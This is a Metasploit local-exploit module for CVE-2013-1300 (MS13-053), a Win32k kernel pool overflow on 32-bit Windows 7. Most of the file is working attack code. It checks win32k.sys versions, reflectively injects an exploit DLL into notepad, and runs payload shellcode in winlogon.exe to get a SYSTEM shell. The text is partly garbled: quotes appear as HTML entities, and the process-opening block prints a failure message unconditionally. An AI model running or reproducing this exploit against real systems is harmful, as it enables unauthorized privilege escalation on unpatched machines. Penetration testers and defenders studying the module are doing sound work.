# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)&#039;,
      &#039;Description&#039;    => %q{
        A kernel pool overflow in Win32k which allows local privilege escalation.
        The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process).
        This allows any unprivileged process to freely migrate to winlogon.exe, achieving
        privilege escalation. Used in pwn2own 2013 by MWR to break out of chrome&#039;s sandbox.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
           &#039;Nils&#039;, #Original Exploit
           &#039;Jon&#039;, #Original Exploit
           &#039;Donato Capitella <donato.capitella[at]mwrinfosecurity.com>&#039;, # Metasploit Conversion
           &#039;Ben Campbell <ben.campbell[at]mwrinfosecurity.com>&#039; # Help and Encouragement ;)
        ],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows 7 SP0/SP1&#039;, { } ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-1300&#039; ],
          [ &#039;MSB&#039;, &#039;MS13-053&#039; ],
          [ &#039;URL&#039;, &#039;https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 01 2013&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
  end

  def check
    os = sysinfo["OS"]
    unless (os =~ /windows/i)
      return Exploit::CheckCode::Unknown
    end

    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    case build
    when 7600
      return Exploit::CheckCode::Vulnerable
    when 7601
      if branch == 18
        return Exploit::CheckCode::Vulnerable if revision < 18176
      else
        return Exploit::CheckCode::Vulnerable if revision < 22348
      end
    end
    return Exploit::CheckCode::Unknown
  end


  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, &#039;Session is already elevated&#039;)
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
    end

    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system")
    end

    print_status("Launching notepad to host the exploit...")
    notepad_process_pid = cmd_exec_get_pid("notepad.exe")
    begin
      process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      print_status("Operation failed. Hosting exploit in the current process...")
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2013-1300", "schlamperei.x86.dll")
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    thread = process.thread.create(exploit_mem + offset)
    client.railgun.kernel32.WaitForSingleObject(thread.handle, 5000)

    client.sys.process.each_process do |p|
      if p[&#039;name&#039;] == "winlogon.exe"
        winlogon_pid = p[&#039;pid&#039;]
        print_status("Found winlogon.exe with PID #{winlogon_pid}")

        if execute_shellcode(payload.encoded, nil, winlogon_pid)
          print_good("Everything seems to have worked, cross your fingers and wait for a SYSTEM shell")
        else
          print_error("Failed to start payload thread")
        end

        break
      end
    end
  end

end

